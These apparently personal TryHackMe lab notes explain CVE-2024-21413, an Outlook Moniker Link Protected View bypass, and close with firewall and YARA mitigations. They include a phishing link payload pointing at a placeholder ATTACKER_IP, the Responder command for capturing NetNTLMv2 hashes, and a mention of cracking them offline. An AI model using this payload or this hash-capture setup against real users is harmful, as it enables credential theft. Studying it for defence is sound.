# CVE-2024-21413 (Moniker Link): Outlook Protected View Bypass

These are my personal notes and key takeaways from the TryHackMe Moniker Link (CVE-2024-21413) room.

---

## 1. SMB Protocol & Automatic Hash Leakage

- **SMB Protocol:** Standard Windows protocol (**Port 445**) for network file and printer sharing.
- **Automatic Authentication (SSO):** When Windows accesses any remote network file (`file://<IP>/...` or `\\<IP>\...`), it automatically sends the current user's **NetNTLMv2 password hash** to authenticate.
- **The Attack Vector:** Windows cannot tell the difference between a real company file server and an attacker's machine. Any remote `file://` link forces Windows to leak credentials to that IP.

---

## 2. Moniker Links & The Protected View Bypass

- **What is a Moniker Link?** A specialized Windows hyperlink using the Component Object Model (COM) that instructs Windows to locate and run an object or file.
- **The Protection (Protected View):** Normally, clicking an external `file://` link inside Outlook triggers a security warning pop-up.
- **The Bug:** By adding an exclamation mark (`!`) to the link:
  ```html
  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  ```
  Outlook's parser gets confused by the `!`, assumes it is an internal object, and **completely skips the Protected View warning**.

---

## 3. The Attack Flow

1. **Start Responder on AttackBox:**
   ```bash
   responder -I ens5
   ```
   *Acts as a fake SMB server waiting for incoming connections on interface `ens5`.*
2. **Send Phishing Email:**
   * Uses an SMTP Python script (**PoC** / Proof of Concept) to send an HTML email with the malicious link: `file://ATTACKER_IP/test!exploit`.
3. **Capture the Hash:**
   * Victim clicks the link in Outlook &rarr; Protected View is bypassed &rarr; Windows silently reaches out over SMB.
   * Responder catches the victim's **NetNTLMv2 hash**, ready to be cracked offline with John the Ripper.

---

## 4. Mitigation & Detection

- **Firewall:** Block outbound **Port 445 (SMB)** at the perimeter firewall to stop credentials from leaving the network.
- **YARA:** Email security gateways use YARA rules (pattern-matching rules) to scan incoming emails and drop messages containing `file://` and `!` links before delivery.
